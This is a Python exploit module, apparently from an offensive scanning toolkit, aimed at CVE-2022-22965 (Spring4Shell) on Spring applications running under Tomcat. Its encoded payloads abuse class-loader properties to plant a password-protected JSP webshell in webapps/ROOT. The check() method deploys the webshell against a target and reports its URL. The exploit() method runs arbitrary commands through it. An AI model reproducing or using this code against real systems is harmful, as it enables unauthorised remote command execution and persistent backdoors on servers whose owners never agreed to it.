import requests
import random
from toolss import utils
from urllib.parse import urljoin
import time,os

class CVE_2022_22965:

    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""

    def __init__(self, target, proxy) -> None:
        self.target = target
        self.proxy = proxy
        self.verify = False
        self.timeout = 10
        self.allow_redirects = False
        self.headers = {
            "User-Agent": 1,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    
    def check(self):
        result = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            filename = f"{path}\\file\\header.txt"
            ua = utils.read_file_slice(filename)
            self.headers["User-Agent"] = random.choice(ua)
            get_payload = urljoin(self.target, self.payload_http)
            requests.post(url=self.target, headers=self.headers, data=self.payload_linux, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
            time.sleep(0.5)
            requests.post(url=self.target, headers=self.headers, data=self.payload_win, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
            time.sleep(0.5)
            requests.get(get_payload, headers=self.headers, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
            time.sleep(0.5)
            url = urljoin(self.target, "tomcatwar.jsp")
            res = requests.get(url, headers=self.headers, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
            if res.status_code == 200:
                # print(f"webshell:{self.target}/tomcatwar.jsp?pwd=tomcat&cmd=whoami")
                result = f"[+] {self.target} 存在 CVE-2022-22965 RCE 漏洞。\r\n[+] webshell地址: {self.target}/tomcatwar.jsp?pwd=tomcat&cmd=whoami"
            else :
                result = f"[-] {self.target} 不存在 CVE-2022-22965 RCE 漏洞。"
            
            return result, err
        except Exception as e:
            err = str(e)
            return result, err

    def exploit(self, command):
        result = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            filename = f"{path}\\file\\header.txt"
            ua = utils.read_file_slice(filename)
            self.headers["User-Agent"] = random.choice(ua)
            path = f"tomcatwar.jsp?pwd=tomcat&cmd={command}"
            test = requests.get(url=urljoin(self.target, "tomcatwar.jsp"), headers=self.headers, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
            if test.status_code == 200:
                res = requests.get(url=urljoin(self.target, path), headers=self.headers, timeout=self.timeout, proxies=self.proxy, allow_redirects=self.allow_redirects, verify=self.verify)
                if res.status_code == 200:
                    result = res.text
                else:
                    result = "执行命令出错了"
            else:
                result = "webshell 出错了，请检查！"
            
            return result, err
        except Exception as e:
            err = str(e)
            return result, err
    